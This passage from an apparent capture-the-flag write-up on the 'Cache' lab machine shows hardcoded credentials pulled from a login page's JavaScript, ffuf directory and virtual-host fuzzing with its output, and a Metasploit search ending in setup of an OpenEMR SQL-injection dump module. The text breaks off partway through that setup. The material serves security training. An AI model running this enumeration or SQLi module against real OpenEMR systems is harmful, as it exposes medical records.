d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we look at the source of <code>login.html</code> we can see this script is included:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">src</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">jquery/functionality.js</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">$</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">var</span><span class="token plain"> error_correctPassword </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">var</span><span class="token plain"> error_username </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">checkCorrectPassword</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">var</span><span class="token plain"> </span><span class="token maybe-class-name">Password</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">$</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;#password&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token method function property-access" style="color:rgb(80, 250, 123)">val</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token maybe-class-name">Password</span><span class="token plain"> </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;H@v3_fun&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token function" style="color:rgb(80, 250, 123)">alert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Password didn&#x27;t Match&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            error_correctPassword </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">checkCorrectUsername</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">var</span><span class="token plain"> </span><span class="token maybe-class-name">Username</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">$</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;#username&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token method function property-access" style="color:rgb(80, 250, 123)">val</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token maybe-class-name">Username</span><span class="token plain"> </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ash&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token function" style="color:rgb(80, 250, 123)">alert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Username didn&#x27;t Match&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            error_username </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">$</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;#loginform&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token method function property-access" style="color:rgb(80, 250, 123)">submit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token parameter">event</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">/* Act on the event */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        error_correctPassword </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         </span><span class="token function" style="color:rgb(80, 250, 123)">checkCorrectPassword</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         error_username </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         </span><span class="token function" style="color:rgb(80, 250, 123)">checkCorrectUsername</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">error_correctPassword </span><span class="token operator">==</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token plain"> </span><span class="token operator">&amp;&amp;</span><span class="token plain"> error_username </span><span class="token operator">==</span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword control-flow" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So the creds are:</p><ul><li>username: <code>ash</code></li><li>password: <code>H@v3_fun</code></li></ul><p>That let us access to <a href="http://cache.htb/net.html" target="_blank" rel="noopener noreferrer">http://cache.htb/net.html</a>, a page under construction.
This is just a troll.</p><p>At <a href="http://cache.htb/author.html" target="_blank" rel="noopener noreferrer">http://cache.htb/author.html</a>, the author is talking about another project:
<em>HMS</em>.</p><p><img loading="lazy" src="https://i.imgur.com/nKwDq7w.png" class="img_ev3q"></p><p><code>hms</code> page or directory don&#x27;t exist; lets&#x27; try to enumerate more with <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://cache.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.1.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://cache.htb/FUZZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Extensions       : .txt .html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response status: 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">login.html              [Status: 200, Size: 2421, Words: 389, Lines: 106]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index.html              [Status: 200, Size: 8193, Words: 902, Lines: 339]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news.html               [Status: 200, Size: 7231, Words: 948, Lines: 100]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">author.html             [Status: 200, Size: 1522, Words: 180, Lines: 68]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.                       [Status: 200, Size: 8193, Words: 902, Lines: 339]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">contactus.html          [Status: 200, Size: 2539, Words: 283, Lines: 148]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">jquery                  [Status: 200, Size: 951, Words: 65, Lines: 17]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">net.html                [Status: 200, Size: 290, Words: 23, Lines: 19]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>That didn&#x27;t gave us new pages. In fact guessing was required to find another
virtual host.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://10.10.10.188/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H &#x27;Host: FUZZ.htb&#x27; -fs 8193</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.1.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://10.10.10.188/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Header           : Host: FUZZ.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response size: 8193</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hms                     [Status: 200, Size: 7850, Words: 1925, Lines: 159]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [38267/38267] :: Job [1/1] :: 911 req/sec :: Duration: [0:00:42] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s add this entry in <code>/etc/hosts</code> too.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep hms</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.188 hms.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We are quickly redirected to <a href="http://hms.htb/interface/login/login.php?site=default" target="_blank" rel="noopener noreferrer">http://hms.htb/interface/login/login.php?site=default</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-exploitation-openemr-sqli">HTTP exploitation (OpenEMR): SQLi<a href="#http-exploitation-openemr-sqli" class="hash-link" aria-label="Direct link to HTTP exploitation (OpenEMR): SQLi" title="Direct link to HTTP exploitation (OpenEMR): SQLi">​</a></h3><p>Its seems we have an openEMR instance.</p><p><img loading="lazy" src="https://i.imgur.com/60GvTJ2.png" class="img_ev3q"></p><p>There are many exploits but we don&#x27;t know which version this is.</p><p><img loading="lazy" src="https://i.imgur.com/3rRzWR6.png" class="img_ev3q"></p><p>Usually I never go to EDB website and only use <code>searchsploit</code>, but this time
we don&#x27;t know the version used, the only thing we know is that is was a version
probably released in 2018 as the copyright is from 2018.</p><p>By searching on EDB website, we have the date of publication of the exploit.
So with some luck we can begin with the exploits published in 2018.</p><p><a href="https://www.exploit-db.com/search?q=openemr" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/search?q=openemr</a></p><p><img loading="lazy" src="https://i.imgur.com/zJSObLw.png" class="img_ev3q"></p><p>But those two exploits require authentication. No luck.</p><p>So let&#x27;s see what exploits are also in <!-- -->[Metasploit][msf]<!-- -->:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 &gt; search openemr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Modules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   #  Name                                             Disclosure Date  Rank       Check  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   -  ----                                             ---------------  ----       -----  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0  auxiliary/sqli/openemr/openemr_sqli_dump         2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   1  exploit/unix/webapp/openemr_sqli_privesc_upload  2013-09-16       excellent  Yes    OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   2  exploit/unix/webapp/openemr_upload_exec          2013-02-13       excellent  Yes    OpenEMR PHP File Upload Vulnerability</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The first one seems promising, let&#x27;s set it up:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (auxiliary/sqli/openemr/openemr_sqli_dump):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name       Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----       ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RPORT      80               yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   